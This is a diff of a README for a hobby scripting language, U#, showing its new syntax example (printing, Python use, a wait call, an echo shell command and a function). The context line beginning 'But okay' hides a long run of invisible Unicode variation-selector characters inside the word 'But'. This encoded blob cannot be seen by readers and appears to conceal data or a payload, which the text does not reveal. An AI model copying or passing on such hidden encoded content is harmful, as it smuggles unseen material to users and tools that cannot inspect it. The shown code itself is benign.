@@ -10,24 +10,17 @@ Despite this, I won't repeat the mistakes I made in RANDG, namely:
 Bu󠄤󠄤󠄦󠄤󠄧󠄥󠄣󠄧󠄦󠄤󠄣󠄥󠄧󠄦󠄥󠄣󠄨󠄧󠄥󠄨󠄧󠄩󠄥󠄤󠄥󠄣󠄨󠄤󠄨󠄩󠄨󠄩󠄤󠄢󠄨󠄤󠄣󠄩󠄨󠄤󠄣󠄨󠄧󠄤󠄥󠄨󠄤󠄥󠄣󠄥󠄧󠄣󠄦󠄥󠄧󠄦󠄥󠄤󠄣󠄧󠄦󠄤󠄥󠄣󠄧󠄨󠄦󠄧󠄨󠄤󠄢󠄩󠄢󠄣󠄩󠄧󠄨󠄢󠄣󠄩󠄨󠄢󠄣󠄢󠄣󠄨󠄩󠄨󠄧󠄣󠄤󠄥󠄣󠄥󠄥󠄧󠄦󠄥󠄨󠄧󠄦󠄣󠄧󠄦󠄢󠄩󠄨󠄧󠄣󠄤󠄩󠄨󠄧󠄢󠄢󠄣󠄣󠄩󠄨󠄧󠄨󠄧󠄥󠄤󠄣󠄤󠄥󠄣󠄧󠄤󠄥󠄣󠄧󠄤󠄤󠄥󠄣󠄨󠄢󠄣󠄨󠄩󠄢󠄨󠄣󠄧󠄤󠄥󠄧󠄦󠄤󠄥󠄣󠄦󠄧󠄨󠄤󠄥󠄣󠄧󠄨󠄥󠄣󠄤󠄤󠄧󠄤󠄧󠄩󠄨󠄢󠄣󠄢󠄧󠄣󠄩󠄨󠄢󠄣󠄧󠄨󠄢󠄣󠄤󠄧󠄨󠄢󠄣󠄩󠄨󠄢󠄣󠄢󠄣󠄤󠄤󠄣󠄥󠄩󠄨󠄤󠄩󠄤󠄥󠄩󠄨󠄣󠄩󠄨󠄤󠄣󠄩󠄨󠄩󠄨󠄣󠄩󠄨󠄤󠄥󠄩󠄨󠄥󠄨󠄧󠄤󠄣󠄤󠄢󠄧󠄤󠄢󠄨󠄧󠄨󠄧󠄨󠄧󠄨󠄧󠄢󠄤󠄨󠄧󠄥󠄥󠄦󠄠󠄩󠄨󠄩󠄨󠄩󠄨󠄤󠄦󠄠󠄩󠄨󠄤󠄥󠄢󠄢󠄠󠄣󠄩󠄤󠄣󠄠󠄩󠄢󠄢󠄠󠄤󠄥󠄤󠄣󠄩󠄨󠄩󠄨󠄥󠄦󠄩󠄦󠄩󠄦󠄨󠄧󠄧󠄨󠄤󠄥󠄣󠄠󠄝󠄠󠄩󠄢󠄠󠄩󠄢󠄣󠄣󠄩󠄤󠄥󠄣󠄩󠄨󠄨󠄩󠄣󠄨󠄧󠄨󠄧󠄦󠄤󠄥󠄩󠄩󠄠󠄢󠄠󠄢󠄣󠄤󠄩󠄨󠄨󠄨󠄩󠄥󠄩󠄨󠄥󠄦󠄩󠄨󠄧󠄨󠄧󠄦󠄨󠄤󠄧󠄤󠄩󠄠󠄣󠄤󠄩󠄠󠄠󠄤󠄣󠄥󠄩󠄠󠄩󠄢󠄣󠄠󠄩󠄠󠄢󠄩󠄢󠄨󠄤󠄧󠄥󠄨󠄩󠄤󠄣󠄩󠄨󠄧󠄢󠄩󠄨󠄢󠄢󠄩󠄣󠄨󠄡󠄡󠄩󠄨󠄢󠄠󠄩󠄨󠄣󠄤󠄩󠄨󠄠󠄢󠄩󠄨󠄥󠄧󠄣󠄨󠄥󠄤󠄣󠄨󠄧󠄤󠄥󠄨󠄧󠄦󠄧󠄦󠄢󠄣󠄠󠄩󠄤󠄢󠄣󠄩󠄢󠄤󠄥󠄧󠄥󠄥󠄦󠄩󠄨󠄤󠄥󠄣󠄠󠄩󠄦󠄥󠄦󠄤󠄧󠄥󠄨󠄧󠄩󠄥󠄥󠄨󠄩󠄩󠄥󠄢󠄠󠄩󠄨󠄣󠄤󠄠󠄩󠄤󠄢󠄠󠄩󠄨󠄣󠄨󠄩󠄠󠄤󠄨󠄨󠄤󠄣󠄤󠄧󠄨󠄧󠄨󠄦󠄧󠄨󠄥󠄧󠄦󠄥󠄦󠄧󠄩󠄨󠄥󠄤󠄢󠄠󠄠󠄩󠄢󠄠󠄩󠄢󠄨󠄣󠄩󠄨󠄤󠄤󠄨󠄧󠄩󠄥󠄩󠄨󠄧󠄥󠄧󠄨󠄩󠄤󠄣󠄨󠄥󠄣󠄨󠄥󠄧󠄩󠄨󠄥󠄢󠄨󠄠󠄩󠄩󠄨󠄠󠄢󠄢󠄠󠄩󠄨󠄣󠄨󠄨󠄩󠄠󠄣󠄨󠄧󠄧󠄨󠄥󠄤󠄧󠄨󠄩󠄤󠄥󠄣󠄧󠄩󠄨󠄤󠄩󠄨󠄤󠄢󠄣󠄠󠄩󠄣󠄢󠄤󠄠󠄩󠄨󠄣󠄩󠄢󠄣t okay, let's get down to demonstrating the full syntax; it's quite simple, and learning it shouldn't be a problem:
 
 ```
-using System;
-// Please, place ; in the end of line, or it give error
-// P.S. using, namespace, public, static and dynamic void does nothing, but it just exists.
-Console.WriteLine("Hello, world! _1");
-namespace nothing;
-static void Main(string[], args);
-Console.Write("Hello, ");
-printu("world! _2");
-I_AM_XD;
-random_number;
-random_symbols;
-wait(5);
-pycommand(print("Hello, world! _3"));
-terminal_command(echo "Hi");
-// CreateFile("Test.txt");
-// ClearFile() cleans file content
-// ClearFile("Test.txt");
-// DeleteFile("Test.txt");
+using re // P.S It now works, you can import python libraries and etc
+printu("Hello, world!") // Hello, world!
+print("Hello world _2!") // You can also use python in U#!
+I_AM_XD // I am xd...
+random_number
+random_symbols
+wait(2) // wait 2 seconds
+terminal_command('echo hi', shell=True) // hi!
+func Hello():
+  print('Hello from function!')
+Hello()
 ```
 
 And that's all the syntax, I'll add more commands as I develop it, but don't expect much...
